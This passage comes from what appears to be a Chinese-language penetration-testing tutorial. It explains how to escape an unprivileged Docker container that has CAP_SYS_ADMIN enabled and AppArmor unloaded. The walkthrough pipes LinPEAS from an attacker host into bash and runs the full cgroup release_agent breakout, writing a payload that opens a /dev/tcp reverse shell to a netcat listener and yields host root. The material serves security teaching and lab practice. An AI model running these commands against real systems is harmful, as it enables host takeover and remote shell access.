<p>Ouch! 分别看到 2 和 1，说明该容器没有使用 -privileged 标记运行。</p>
<p>为了查看我们之前所做的三项检查中特权和非特权之间的区别，我们还可以检查 /dev 以确认这不是一个特权容器。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ls /dev</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174927725-178055862-b71436348a0947fecc1d9f7736d28a31.png" width="501" height="65" class="img_ev3q"></p>
<p>与在特权容器中相比，在 /dev 中几乎看不到任何文件或子目录，这进一步表明该容器没有特权。</p>
<p>那么，如果容器没有特权，我们该如何逃生呢？这取决于该容器是否被授予了任何权限。如果设置的是默认权限，那么我们很可能无法逃出。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="52寻找其它突破方法"><strong><div id="id5.2">5.2、寻找其它突破方法</div></strong><a href="#52寻找其它突破方法" class="hash-link" aria-label="52寻找其它突破方法的直接链接" title="52寻找其它突破方法的直接链接">​</a></h4>
<p>如果容器拥有默认权限，那么它基本就被锁定了。不过，我们仍应检查是否授予了任何权限。如果我们运气好，启用了正确的组合，我们就可以逃出这个容器。</p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="521查找已启用的有趣功能--cap_sys_admin"><strong><div id="id5.2.1">5.2.1、查找已启用的有趣功能 – CAP_SYS_ADMIN</div></strong><a href="#521查找已启用的有趣功能--cap_sys_admin" class="hash-link" aria-label="521查找已启用的有趣功能--cap_sys_admin的直接链接" title="521查找已启用的有趣功能--cap_sys_admin的直接链接">​</a></h6>
<p>我们首先要检查的是，我们是否启用了任何可以帮助我们突围的功能。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">capsh --print</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174928781-1658504243-3bd4b829e0723be69602f6a472139afd.png" width="1024" height="324" class="img_ev3q"></p>
<p>在这里，我们可以看到在容器中启用 <strong>CAP_SYS_ADMIN</strong> 的一个重要功能。有很多功能可用于突破 docker 容器，但这个功能是迄今为止最好用的功能。</p>
<blockquote>
<p>需要使用 CAP_SYS_ADMIN 来执行容器内所需的一系列管理操作。如果在容器内执行特权操作，但没有使用 -privileged 标记，那么该功能很可能是为 &quot;最小特权原则 &quot; 而设置的。</p>
</blockquote>
<p>由于我们发现在此容器中启用了 CAP_SYS_ADMIN，因此我们需要重点关注专门使用此功能的漏洞利用。</p>
<p>对我们来说幸运的是， <a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/" target="_blank" rel="noopener noreferrer">Felix Wilhelm</a> 发现了一个漏洞，只要满足 2 个条件，攻击者就可以突破 docker 容器：<strong>启用 CAP_SYS_ADMIN 、 AppArmor 停止或未加载</strong>。</p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="522确认-apparmor-未加载"><strong><div id="id5.2.2">5.2.2、确认 AppArmor 未加载</div></strong><a href="#522确认-apparmor-未加载" class="hash-link" aria-label="522确认-apparmor-未加载的直接链接" title="522确认-apparmor-未加载的直接链接">​</a></h6>
<p>根据这次攻击的要求，我们需要做的就是检查 AppArmor 是否正在运行。如果幸运的话，我们发现它没有被加载或停止运行，那么我们就可以突破这个容器并在宿主机上获得 root 权限！</p>
<p>要检查 AppArmor 是否正在运行，我们所要做的就是检查一个文件，即 <strong>/sys/kernel/security/apparmor/profiles</strong> 文件。</p>
<p>如果检查 /sys/kernel/security/apparmor/profiles 的内容，显示 一堆 profile 列表，则表明 AppArmor 正在运行；如果显示 空文件且不返回任何内容，则表明 AppArmor 已停止；如果提示该文件不存在，则表明 AppArmor 未被加载。</p>
<p>到了关键时刻……</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cat /sys/kernel/security/apparmor/profiles</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174927881-1167424575-9919a12642cbea1daafc2db8a514f194.png" width="580" height="49" class="img_ev3q"></p>
<p>Perfect！我们检查该文件后发现它不存在，这意味着 AppArmor 未被加载！</p>
<p>由于 AppArmor 未加载且 CAP_SYS_ADMIN 已启用，因此我们拥有突破此容器所需的两个条件，即便该容器启动时并未设置 –privileged 标志。</p>
<p>然而，在我们了解如何突破这个容器之前，让我们再来看看 LinPEAS 在容器内部的枚举效果如何。。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="53使用工具寻找-docker-突破口--linpeas"><strong><div id="id5.3">5.3、使用工具寻找 Docker 突破口 – LinPEAS</div></strong><a href="#53使用工具寻找-docker-突破口--linpeas" class="hash-link" aria-label="53使用工具寻找-docker-突破口--linpeas的直接链接" title="53使用工具寻找-docker-突破口--linpeas的直接链接">​</a></h4>
<p>假设一切都已设置完毕并准备就绪（HTTP 服务器在攻击者上运行以提供 LinPEAS），我们需要做的就是下载并执行 LinPEAS。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">curl 172.16.1.30/linpeas.sh | bash</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174928336-1897081168-ed1dc6627053938d78879930d18400ac.png" width="661" height="87" class="img_ev3q"></p>
<p>首先，我们会注意到测试结果是以 root 身份运行的。不幸的是，这会导致一些误报。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174928411-810511639-792f8141a72ce8c107e36a9791a4a560.png" width="860" height="196" class="img_ev3q"></p>
<p>因为我们是 root，所以我们会看到很多红色/黄色的结果。为了消除噪音，实际上，在运行 LinPEAS 之前，我们已经进行了一些手动枚举，以确定我们是处在容器中。了解了这一点，我们就可以避开噪音，直接获取我们想知道的信息。</p>
<p>如果我们向下滚动一点，我们将看到 “Protections”，在这里我们可以看到容器中启用了哪些安全功能。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174927210-1307698889-4c7b5e5413addf36dcd484f5c4cbf4d3.png" width="478" height="230" class="img_ev3q"></p>
<p>这告诉我们 seccomp 已启用，但 AppArmor 是 “unconfined”，这意味着我们应该能够使用 <strong>mount</strong> 命令。</p>
<blockquote>
<p>启用 AppArmor 后，您将无法使用 mount 命令，权限将被拒绝。</p>
</blockquote>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="531找到很多关于容器的好信息"><strong><div id="id5.3.1">5.3.1、找到很多关于容器的好信息</div></strong><a href="#531找到很多关于容器的好信息" class="hash-link" aria-label="531找到很多关于容器的好信息的直接链接" title="531找到很多关于容器的好信息的直接链接">​</a></h6>
<p>在 “Protections” 小节下方，我们将看到 “Container” 部分，这里是我们了解容器配置最多的地方。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174931304-1340741954-d999c56aff57aeec07a72bc8200ebe71.png" width="1024" height="707" class="img_ev3q"></p>
<p>在这里我们可以看到 LinPEAS 已经确定我们处于一个容器中，并且它表明 AppArmor 是 “unconfined”。然而，最有趣的发现是 docker 很容易受到 “release_agent breakout” 1 和 2 的影响。</p>
<p>接下来，如果我们再向下滚动一点，我们可以看到“Container Capabilities”。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174932212-906487715-a48b2bb7ac4d12214a4d4d5cb0732826.png" width="1024" height="358" class="img_ev3q"></p>
<p>本节以外的其余检查都是标准检查，由于已经是 root，所以它们充满了红色/黄色发现的误报。</p>
<p>LinPEAS 在枚举容器内部方面做得很好。它能够找到我们通过手动枚举找到的所有信息；然而，真正的好处是 LinPEAS 可以根据当前权限集检查可以使用的不同突破方法。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="54使用release_agent-breakout-2-方法突破非特权容器"><strong><div id="id5.4">5.4、使用release_agent Breakout 2 方法突破非特权容器</div></strong><a href="#54使用release_agent-breakout-2-方法突破非特权容器" class="hash-link" aria-label="54使用release_agent-breakout-2-方法突破非特权容器的直接链接" title="54使用release_agent-breakout-2-方法突破非特权容器的直接链接">​</a></h4>
<p>通过枚举 docker 容器，我们发现应该能够使用 “release_agent breakout 2” 方法进行突破。</p>
<p>现在让我们看看如何使用此技术进行突破并以 root 身份获得反向 shell！</p>
<p>首先，我们需要挂载 RDMA cgroup 控制器并创建一个子 cgroup。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>完成后，我们需要在“x”cgroup 发布时启用 cgroup 通知。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo 1 &gt; /tmp/cgrp/x/notify_on_release</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>接下来，我们需要找到容器的 OverlayFS 的挂载路径。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">host_path=`sed -n &#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27; /etc/mtab`</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>设置完毕后，下一步是将 release_agent 设置为 /path/payload</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo &quot;$host_path/breakout&quot; &gt; /tmp/cgrp/release_agent</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>现在，我们将制作有效载荷，它将是通过端口 443 到达我们攻击者机器的反向 shell。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;#!/bin/bash&#x27; &gt; /breakout</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;bash -i &gt;&amp; /dev/tcp/172.16.1.30/443 0&gt;&amp;1&#x27; &gt;&gt; /breakout</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>接下来，我们只需要为有效载荷添加执行权限，然后返回到我们的攻击者机器在端口 443 上设置一个 netcat 监听器。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">chmod a+x /breakout</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>回到我们的攻击者机器上......</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nc -nvlp 443</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>最后，再次回到受害者，我们现在可以使用以下命令执行我们的有效负载：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sh -c &quot;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174929175-1695442517-7aaeae486e2b2115c1fcca7547b7e27b.png" width="837" height="292" class="img_ev3q"></p>
<p>关键时刻，我们获得了 root shell。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174931361-606738713-0ab0dca17611daa02066e4103786572c.png" width="628" height="526" class="img_ev3q"></p>
<p>Amazing！即使启动容器没有设置 <strong>–privileged</strong> 标志，我们也能够突破并获得主机的 root 权限！当然，要使此漏洞发挥作用，确实需要设置一些权限。</p></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/web/docs/渗透/Linux 提权/Linux 提权-Cron Jobs"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">Linux 提权-Cron Jobs</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/web/docs/渗透/Linux 提权/Linux 提权-LXD 容器"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">Linux 提权-LXD 容器</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#导航" class="table-of-contents__link toc-highlight">导航</a></li><li><a href="#0前言" class="table-of-contents__link toc-highlight"><strong><div>0、前言</div></strong></a></li><li><a href="#1什么是-docker-" class="table-of-contents__link toc-highlight"><strong><div>1、什么是 Docker ?</div></strong></a></li><li><a href="#2寻找-docker-权限" class="table-of-contents__link toc-highlight"><strong><div>2、寻找 Docker 权限</div></strong></a></li><li><a href="#3场景1通过滥用-docker-组权限提权" class="table-of-contents__link toc-highlight"><strong><div>3、场景1：通过滥用 Docker 组权限提权</div></strong></a></li><li><a href="#4场景2直接在特权容器中立足" class="table-of-contents__link toc-highlight"><strong><div>4、场景2：直接在特权容器中立足</div></strong></a></li><li><a href="#5场景3直接在非特权容器中立足" class="table-of-contents__link toc-highlight"><strong><div>5、场景3：直接在非特权容器中立足</div></strong></a></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="margin-bottom--sm"><a href="https://www.cnblogs.com/kqdssheng" rel="noopener noreferrer" class="footerLogoLink_BH7S"><img src="/web/img/logo.svg" alt="博客园" class="footer__logo themedComponent_mlkZ themedComponent--light_NVdE" width="30" height="30"><img src="/web/img/logo.svg" alt="博客园" class="footer__logo themedComponent_mlkZ themedComponent--dark_xIcU" width="30" height="30"></a></div></div></div></footer></div>
</body>
</html>